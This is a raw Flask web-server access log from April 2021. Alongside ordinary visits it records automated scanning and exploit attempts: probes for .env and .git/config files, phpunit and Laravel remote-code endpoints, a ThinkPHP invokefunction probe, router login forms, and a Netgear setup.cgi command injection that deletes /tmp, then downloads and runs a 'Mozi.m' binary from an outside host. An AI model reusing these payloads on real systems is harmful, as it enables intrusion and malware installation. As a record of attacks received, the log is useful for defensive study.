 * Serving Flask app "makemyday" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
207.177.184.12 - - [14/Apr/2021 21:31:37] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 21:31:47] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 21:32:18] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 21:32:18] "[37mGET /static/favicon.ico HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 21:32:20] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 21:32:20] "[37mGET /static/favicon.ico HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 21:42:27] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 21:43:13] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 21:43:13] "[37mGET /static/favicon.ico HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 21:44:20] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 21:45:33] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 21:45:42] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 22:01:26] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 22:04:36] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 22:11:53] "[37mGET / HTTP/1.1[0m" 200 -
207.177.184.12 - - [14/Apr/2021 22:12:00] "[37mGET / HTTP/1.1[0m" 200 -
209.17.96.98 - - [15/Apr/2021 01:39:45] "[37mGET / HTTP/1.1[0m" 200 -
193.46.255.97 - - [15/Apr/2021 02:41:21] "[33mHEAD /robots.txt HTTP/1.0[0m" 404 -
35.238.142.202 - - [15/Apr/2021 02:48:29] "[33mGET /.env HTTP/1.1[0m" 404 -
35.238.142.202 - - [15/Apr/2021 02:48:29] "[31m[1mPOST / HTTP/1.1[0m" 400 -
196.64.149.106 - - [15/Apr/2021 03:35:16] "[33mGET /.env HTTP/1.1[0m" 404 -
196.64.149.106 - - [15/Apr/2021 03:35:16] "[31m[1mPOST / HTTP/1.1[0m" 400 -
193.169.255.27 - - [15/Apr/2021 04:30:07] "[37mGET / HTTP/1.0[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:50:04] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:50:05] "[37mGET /static/favicon.ico HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:50:24] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:50:24] "[37mGET /static/favicon.ico HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:50:28] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:51:19] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:51:28] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:51:37] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:54:51] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:55:02] "[37mPOST / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:55:08] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 04:56:42] "[37mGET / HTTP/1.1[0m" 200 -
192.241.207.116 - - [15/Apr/2021 05:15:32] "[33mGET /portal/redlion HTTP/1.1[0m" 404 -
73.170.49.174 - - [15/Apr/2021 05:32:10] "[37mGET / HTTP/1.1[0m" 200 -
103.41.25.164 - - [15/Apr/2021 07:01:47] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.41.25.164:44923/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
45.144.225.96 - - [15/Apr/2021 07:50:54] "[37mGET / HTTP/1.1[0m" 200 -
206.189.98.227 - - [15/Apr/2021 08:35:11] "[37mGET / HTTP/1.0[0m" 200 -
206.189.98.227 - - [15/Apr/2021 09:02:06] "[33mGET /_ignition/execute-solution HTTP/1.1[0m" 404 -
192.241.208.238 - - [15/Apr/2021 09:15:41] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
203.45.101.10 - - [15/Apr/2021 09:18:35] "[37mGET / HTTP/1.1[0m" 200 -
178.128.226.42 - - [15/Apr/2021 10:01:05] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
205.185.122.102 - - [15/Apr/2021 10:18:55] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
192.241.199.252 - - [15/Apr/2021 10:23:09] "[33mGET /hudson HTTP/1.1[0m" 404 -
45.9.148.178 - - [15/Apr/2021 10:31:20] "[33mGET /.git/config HTTP/1.1[0m" 404 -
184.105.139.69 - - [15/Apr/2021 10:43:33] "[37mGET / HTTP/1.1[0m" 200 -
34.200.114.5 - - [15/Apr/2021 11:30:21] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
34.200.114.5 - - [15/Apr/2021 11:30:21] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
34.200.114.5 - - [15/Apr/2021 11:30:21] "[37mGET / HTTP/1.1[0m" 200 -
34.200.114.5 - - [15/Apr/2021 11:30:21] "[33mGET /login HTTP/1.1[0m" 404 -
34.200.114.5 - - [15/Apr/2021 11:30:21] "[33mGET /jenkins/login HTTP/1.1[0m" 404 -
34.200.114.5 - - [15/Apr/2021 11:30:21] "[33mGET /manager/html HTTP/1.1[0m" 404 -
34.200.114.5 - - [15/Apr/2021 11:30:21] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
34.200.114.5 - - [15/Apr/2021 11:30:21] "[37mGET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP HTTP/1.1[0m" 200 -
36.255.242.50 - - [15/Apr/2021 11:30:23] "[37mGET / HTTP/1.1[0m" 200 -
101.0.41.156 - - [15/Apr/2021 11:36:05] "[33mPOST /GponForm/diag_Form?images/ HTTP/1.1[0m" 404 -
91.122.210.7 - - [15/Apr/2021 11:44:18] "[37mGET / HTTP/1.1[0m" 200 -
45.155.205.211 - - [15/Apr/2021 11:45:35] "[33mGET /console/ HTTP/1.1[0m" 404 -
45.155.205.211 - - [15/Apr/2021 11:45:35] "[33mGET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1[0m" 404 -
45.155.205.211 - - [15/Apr/2021 11:45:35] "[33mPOST /api/jsonws/invoke HTTP/1.1[0m" 404 -
45.155.205.211 - - [15/Apr/2021 11:45:35] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
